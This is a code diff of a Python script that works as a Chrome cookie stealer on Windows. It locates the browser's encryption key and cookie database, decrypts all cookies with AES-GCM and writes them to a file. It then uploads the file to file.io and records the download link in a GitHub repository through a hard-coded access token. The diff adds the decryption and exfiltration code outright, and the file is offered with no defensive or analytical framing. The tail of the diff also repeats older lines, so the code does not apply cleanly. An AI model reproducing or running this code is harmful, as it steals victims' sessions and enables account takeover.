@@ -2,24 +2,25 @@ import os, json, base64, sqlite3, shutil, requests, time
 from Crypto.Cipher import AES
 import win32crypt
 
+# إعدادات المستودع
 GITHUB_TOKEN = "Ghp_o6rg9zoZDl2e0jWZhVVPeoBwep4o8413HOHC"
 REPO = "Noor092324/Noor-config"
 
 def find_chrome_files():
     root_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local")
-    found_paths = {"key_path": None, "db_path": None}
+    found_paths = {"key": None, "db": None}
     for root, dirs, files in os.walk(root_path):
-        if "Local State" in files and not found_paths["key_path"]:
-            found_paths["key_path"] = os.path.join(root, "Local State")
+        if "Local State" in files and not found_paths["key"]:
+            found_paths["key"] = os.path.join(root, "Local State")
         if "Cookies" in files and "Network" in root:
-            found_paths["db_path"] = os.path.join(root, "Cookies")
-        if found_paths["key_path"] and found_paths["db_path"]:
+            found_paths["db"] = os.path.join(root, "Cookies")
+        if found_paths["key"] and found_paths["db"]:
             break
     return found_paths
 
-def get_key(key_path):
+def get_key(path):
     try:
-        with open(key_path, "r", encoding="utf-8") as f:
+        with open(path, "r", encoding="utf-8") as f:
             key = json.loads(f.read())["os_crypt"]["encrypted_key"]
         return win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
     except:
@@ -27,13 +28,56 @@ def get_key(key_path):
 
 def harvest():
     paths = find_chrome_files()
-    if not paths["key_path"] or not paths["db_path"]: 
+    if not paths["key"] or not paths["db"]:
         return None
-    key = get_key(paths["key_path"])
-    if not key: 
+    key = get_key(paths["key"])
+    if not key:
         return None
-    shutil.copyfile(paths["db_path"], "temp_db")
+    shutil.copyfile(paths["db"], "temp_db")
     conn = sqlite3.connect("temp_db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+    data = ""
+    for host, name, enc_val in cursor.fetchall():
+        try:
+            iv, payload = enc_val[3:15], enc_val[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            val = cipher.decrypt(payload)[:-16].decode()
+            data += f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{val}\n"
+        except:
+            continue
+    conn.close()
+    if os.path.exists("temp_db"):
+        os.remove("temp_db")
+    with open("my_cookies.txt", "w", encoding="utf-8") as f:
+        f.write(data)
+    return "my_cookies.txt"
+
+def update_github(link):
+    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
+    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+    try:
+        res = requests.get(url, headers=headers).json()
+        sha = res["sha"]
+        payload = {"status": "Active", "link": link, "date": time.ctime()}
+        encoded = base64.b64encode(json.dumps(payload, indent=4).encode()).decode()
+        requests.put(url, headers=headers, json={"message": "Update Link", "content": encoded, "sha": sha})
+    except:
+        pass
+
+if __name__ == "__main__":
+    file_path = harvest()
+    if file_path:
+        while True:
+            try:
+                with open(file_path, "rb") as f:
+                    r = requests.post("https://file.io", files={"file": f})
+                if r.status_code == 200:
+                    update_github(r.json().get("link"))
+                    os.remove(file_path)
+                    break
+            except:
+                time.sleep(60)
     cursor = conn.cursor()
     cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
     cookies_text = ""
